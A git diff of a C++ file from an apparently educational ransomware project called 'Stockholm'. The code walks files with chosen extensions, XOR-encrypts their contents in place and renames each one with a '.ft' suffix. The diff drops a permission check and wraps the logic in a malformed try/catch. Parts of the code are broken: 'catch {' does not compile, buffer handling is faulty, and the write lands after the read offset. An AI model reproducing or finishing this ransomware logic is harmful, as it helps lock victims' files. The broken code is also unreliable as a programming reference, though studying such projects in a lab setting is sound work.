@@ -6,7 +6,7 @@
 /*   By: bguyot <bguyot@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/05/19 09:51:57 by bguyot            #+#    #+#             */
-/*   Updated: 2023/05/19 14:52:27 by bguyot           ###   ########.fr       */
+/*   Updated: 2023/05/19 14:54:40 by bguyot           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -120,40 +120,40 @@ void	Stockholm::_cipherFile(std::filesystem::path path)
 	//check if the file path extension is in the _extensions vector
 	if (std::find(this->_extensions.begin(), this->_extensions.end(), path.extension()) == this->_extensions.end())
 		return ;
-	//TODO: check permissions
-	if (std::filesystem::permissions(path) != std::filesystem::perms::owner_write)
-	{
-		return ;
-	}
-
-	if (!this->_silent)
-		std::cout << "Ciphering file " << path << std::endl;
+		
+	
 	//cipher the file
-	int fd = open(path.c_str(), O_RDWR);
-	if (fd == -1)
-	{
-		std::cout << "Error while opening file " << path << std::endl;
+	try {
+		int fd = open(path.c_str(), O_RDWR);
+		if (fd == -1)
+		{
+			std::cout << "Error while opening file " << path << std::endl;
+			return ;
+		}
+		char *buffer = new char[1024];
+		int ret = 0;
+		string file_data = "";
+		while ((ret = read(fd, buffer, 1024)) > 0)
+		{
+			file_data += buffer;
+		}
+		if (ret == -1)
+		{
+			std::cout << "Error while reading file " << path << std::endl;
+			return ;
+		}
+		for (int i = 0; i < file_data.length(); i++)
+		{
+			file_data[i] ^= this->_key[i % this->_key.length()];
+		}
+		write(fd, file_data.c_str(), file_data.length());	
+		close(fd);
+		//add the .ft extension to the file
+		std::filesystem::path newPath = path;
+		std::filesystem::rename(path, newPath += ".ft");
+		if (!this->_silent)
+			std::cout << "Ciphering file " << path << std::endl;
+	} catch {
 		return ;
 	}
-	char *buffer = new char[1024];
-	int ret = 0;
-	string file_data = "";
-	while ((ret = read(fd, buffer, 1024)) > 0)
-	{
-		file_data += buffer;
-	}
-	if (ret == -1)
-	{
-		std::cout << "Error while reading file " << path << std::endl;
-		return ;
-	}
-	for (int i = 0; i < file_data.length(); i++)
-	{
-		file_data[i] ^= this->_key[i % this->_key.length()];
-	}
-	write(fd, file_data.c_str(), file_data.length());	
-
-	//add the .ft extension to the file
-	std::filesystem::path newPath = path;
-	std::filesystem::rename(path, newPath += ".ft");+
 }
